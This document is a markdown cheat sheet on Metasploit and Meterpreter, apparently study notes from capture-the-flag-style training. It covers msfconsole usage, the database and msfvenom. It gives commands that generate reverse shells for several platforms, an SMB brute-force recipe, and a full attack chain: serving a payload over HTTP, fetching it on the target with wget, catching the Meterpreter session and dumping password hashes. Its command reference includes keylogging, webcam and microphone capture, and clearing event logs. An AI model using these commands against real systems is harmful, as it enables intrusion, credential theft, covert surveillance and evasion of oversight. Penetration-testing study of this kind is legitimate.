# Metasploit & Meterpreter

## 🧰 Overview

Metasploit supports all phases of a penetration testing engagement — from information gathering to post-exploitation.

| Version | Description |
|---------|-------------|
| **Metasploit Pro** | Commercial version — GUI available, facilitates automation and task management |
| **Metasploit Framework** | Open-source version — command-line based |
| **Msfconsole** | Main command-line interface |

### Key Terminology

| Term | Description |
|------|-------------|
| **Exploit** | Piece of code that takes advantage of a vulnerability |
| **Vulnerability** | A flaw in a system that can be exploited |
| **Payload** | Code that runs on the target system after exploitation |

---

## 📦 Metasploit Modules

```bash
msfconsole                                  # Launch Metasploit
cd /opt/metasploit-framework/embedded/framework/modules
```

| Command | Module | Description |
|---------|--------|-------------|
| `tree -L 1 auxiliary/` | Auxiliary | Scanners, crawlers, fuzzers |
| `tree -L 1 encoders/` | Encoders | Encode exploits/payloads to evade signature-based AV |
| `tree -L 1 evasion/` | Evasion | Attempt to evade antivirus detection |
| `tree -L 1 exploits/` | Exploits | Exploits organised by target OS |
| `tree -L 1 nops/` | NOPs | Buffer to achieve consistent payload sizes |
| `tree -L 1 payloads/` | Payloads | Shells and stagers for target systems |
| `tree -L 1 post/` | Post | Post-exploitation modules |

### Payload Types

| Type | Description |
|------|-------------|
| **Adapters** | Wraps single payloads into different formats e.g. PowerShell adapter |
| **Singles** | Self-contained payloads (add user, launch notepad.exe) — no download required |
| **Stagers** | Set up a connection channel, upload a small stager first, then download the rest |
| **Stages** | Downloaded by the stager — allows use of larger payloads |

---

## 🖥️ Msfconsole Commands

### General

| Command | Description |
|---------|-------------|
| `ls` | List contents of the folder Metasploit was launched from |
| `ping -c 1 8.8.8.8` | Send a single ping to Google DNS |
| `clear` | Clear the terminal screen |
| `help` | Show help menu — or `help <command>` for specific help |
| `history` | Show history of typed commands |

### Module Navigation

| Command | Description | Example |
|---------|-------------|---------|
| `use` | Load a module | `use exploit/windows/smb/ms17_010_eternalblue` |
| `show options` | Show required parameters for the current module | `show options` |
| `show <type>` | Show available modules of a type | `show payloads` |
| `back` | Leave current module context | `back` |
| `info` | Show further info about current module | `info` |
| `search` | Search the Metasploit DB for relevant modules | `search ms17-010` |
| `search type:auxiliary telnet` | Search by type and keyword | — |

### Execution & Sessions

| Command | Description |
|---------|-------------|
| `exploit` | Launch the module |
| `exploit -z` | Run exploit and background the session |
| `background` | Background the current session and return to msfconsole |
| `sessions` | List all active sessions |
| `sessions -i <id>` | Connect to a specific session |
| `CTRL+Z` | Background an opened session |
| `CTRL+C` | Abort session |

### Parameters

| Command | Description |
|---------|-------------|
| `set <param> <value>` | Set a parameter value |
| `setg <param> <value>` | Set a global parameter (applies across all modules) |
| `unset <param>` | Clear a parameter |
| `unset all` | Clear all parameters |

### Common Parameters

| Parameter | Description |
|-----------|-------------|
| `RHOSTS` | Remote host — target IP (supports `/24`, `/16` notation) |
| `RPORT` | Remote port — port the vulnerable app is running on |
| `PAYLOAD` | Payload to use in the exploit |
| `LHOST` | Local host — attacker machine IP |
| `LPORT` | Local port — port for the reverse shell to connect back to |
| `SESSION` | Session ID used in post-exploitation modules |

---

## 🔍 Scanning & Exploitation

### Port Scanning

```bash
search portscan                             # List port scanning modules
nmap -sS <targetIP>                         # Scan IP from within msfconsole
```

### Service Discovery

```bash
# UDP sweep — identify services like DNS, NetBIOS
use auxiliary/scanner/discovery/udp_sweep
run

# SMB version scan
use auxiliary/scanner/smb/smb_version
run
```

### SMB Brute Force

```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <target_IP>
set SMBUser penny
set PASS_FILE /usr/share/wordlists/fileName.txt
run
```

### Vulnerability Scanning

> **Low-hanging fruit:** Easily identifiable and exploitable vulnerabilities — e.g. if you identify a VNC service running, use `search` to find relevant modules.

```bash
# General workflow
search <service/vulnerability>
info                                        # Understand the module before using it
show payloads                               # List available payloads
set payload <choice>
exploit
```

---

## 🗄️ Metasploit Database

The DB helps manage different projects and avoid confusion between parameter values.

```bash
systemctl start postgresql                  # Start PostgreSQL
msfdb init                                  # Initialise Metasploit DB
sudo -u postgres msfdb init                 # Initialise without root
sudo -u postgres msfdb delete               # Delete existing DB
```

### Inside Msfconsole

```bash
db_status                                   # Check DB connection status
workspace                                   # List available workspaces
workspace -a tryhackme                      # Add a workspace
workspace -d tryhackme                      # Delete a workspace
workspace tryhackme                         # Switch to workspace
workspace -h                                # Show workspace options
db_nmap                                     # Run Nmap and save results to DB
hosts                                       # Info on discovered hosts
hosts -h                                    # Show host command options
hosts -R                                    # Set all discovered hosts as RHOSTS
services                                    # Info on discovered services
services -S netbios                         # Search for a specific service
```

### Workflow Example

```bash
use auxiliary/scanner/smb/smb_ms17_010      # Load MS17-010 scanning module
hosts -R                                    # Set all discovered hosts as RHOSTS
show options                                # Verify parameters
run
```

---

## 🧬 Msfvenom

Msfvenom generates payloads in different formats for different target systems.

```bash
msfvenom --list formats                     # List supported output formats
msfvenom --list payloads | grep meterpreter # List Meterpreter payloads
```

### Payload Examples by Platform

```bash
# PHP reverse shell
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php

# Linux ELF reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f elf > rev_shell.elf

# Windows executable reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe > rev_shell.exe

# PHP Meterpreter reverse shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=xxx LPORT=xxx -f raw > rev_shell.php

# Python reverse shell
msfvenom -p cmd/unix/meterpreter/reverse_python LHOST=xxx LPORT=xxx -f raw > shell.py
```

### Setting Up the Handler

```bash
use exploit/multi/handler
set payload php/reverse_php                 # Match the payload used in msfvenom
set LHOST <your_IP>
set LPORT <your_port>
run                                         # Wait for reverse connection
```

### Full Attack Example

```bash
# On attacker machine — generate payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.112.73.138 LPORT=4444 -f elf > shell.elf

# On attacker machine — serve payload over HTTP
python3 -m http.server 9000

# On target machine — download payload
wget http://10.112.73.138:9000/shell.elf
sudo su                                     # Escalate to root

# On attacker machine — set up handler
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 10.112.73.138
set LPORT 4444
run                                         # Receive Meterpreter session

# Post-exploitation — dump hashes
background                                  # Background the session
use post/linux/gather/hashdump
set SESSION <previous_session_id>
run
```

---

## 🐍 Meterpreter

Meterpreter runs **in memory** on the target system, interacting with the OS without writing to disk — harder to detect.

```bash
getpid                                      # Show current process ID Meterpreter is running in
ps                                          # List running processes on target
```

> **Payload version choice depends on:**
> - Target OS
> - Components available (Python installed? PHP website?)
> - Network connection type (raw TCP? HTTPS only? IPv4/IPv6?)

---

### 📋 Meterpreter Command Reference

#### Core Commands

| Command | Description |
|---------|-------------|
| `background` | Background the current session |
| `exit` | Terminate Meterpreter session |
| `guid` | Get session GUID (Globally Unique Identifier) |
| `help` | Display help menu |
| `info` | Display info about a Post module |
| `irb` | Open interactive Ruby shell on current session |
| `load` | Load Meterpreter extensions |
| `migrate` | Migrate to another process (note: privileges may be lost) |
| `run` | Execute a Meterpreter script or Post module |
| `sessions` | Switch to another session |

#### File System Commands

| Command | Description | Example |
|---------|-------------|---------|
| `cd` | Change directory | `cd C:\\Users` |
| `ls` / `dir` | List files in current directory | `ls` |
| `pwd` | Print current working directory | `pwd` |
| `edit` | Edit a file | `edit file.txt` |
| `cat` | Show file content | `cat "c:\inetpub\wwwroot\realsecret.txt"` |
| `rm` | Delete a file | `rm file.txt` |
| `search` | Search for files | `search -f flag.txt` |
| `upload` | Upload a file or directory | `upload shell.elf /tmp/` |
| `download` | Download a file or directory | `download secret.txt` |

#### Networking Commands

| Command | Description |
|---------|-------------|
| `arp` | Display host ARP cache |
| `ifconfig` | Display network interfaces on target |
| `netstat` | Display network connections |
| `portfwd` | Forward a local port to a remote service |
| `route` | View and modify routing table |

#### System Commands

| Command | Description |
|---------|-------------|
| `clearev` | Clear event logs |
| `execute` | Execute a command |
| `getpid` | Show current process identifier |
| `getuid` | Show user Meterpreter is running as |
| `kill` | Terminate a process |
| `pkill` | Terminate processes by name |
| `ps` | List running processes |
| `reboot` | Reboot the remote computer |
| `shell` | Drop into a system shell (`CTRL+Z` to return to Meterpreter) |
| `shutdown` | Shut down the remote computer |
| `sysinfo` | Get remote system information (OS, hostname, etc.) |

#### Surveillance & Privilege Commands

| Command | Description |
|---------|-------------|
| `idletime` | Return seconds the remote user has been idle |
| `keyscan_start` | Start capturing keystrokes |
| `keyscan_dump` | Dump the keystroke buffer |
| `keyscan_stop` | Stop capturing keystrokes |
| `screenshot` | Grab a screenshot of the desktop |
| `screenshare` | Watch the remote user's desktop in real time |
| `record_mic` | Record audio from the default microphone |
| `webcam_list` | List available webcams |
| `webcam_snap` | Take a snapshot from a webcam |
| `webcam_stream` | Stream video from a webcam |
| `webcam_chat` | Start a video chat |
| `getsystem` | Attempt to escalate privileges to SYSTEM |
| `hashdump` | Dump the SAM database (users and password hashes) |

---

### Post-Exploitation Example

```bash
meterpreter > background
# [*] Backgrounding session 1...

msf6 > use post/windows/gather/enum_domain
set SESSION 1
run
```
